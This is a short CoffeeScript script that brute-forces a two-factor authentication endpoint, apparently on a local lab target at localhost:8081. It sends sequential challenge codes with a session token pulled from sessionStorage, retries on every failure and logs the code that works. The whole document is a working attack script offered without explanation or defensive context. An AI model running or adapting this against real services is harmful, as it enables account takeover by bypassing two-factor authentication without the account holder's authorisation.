f = (i) ->
    $.ajax(
        type: "PUT"
        contentType: "application/json"
        url: "http://localhost:8081/2fa"
        data: JSON.stringify
            challenge: "#{i}"
            token: sessionStorage.getItem "token"
    )
        .then(
            -> console.log i,
            ->
                if i % 100 is 0 then console.log "==== #{i} ===="
                f(i + 1)
        )
f 0
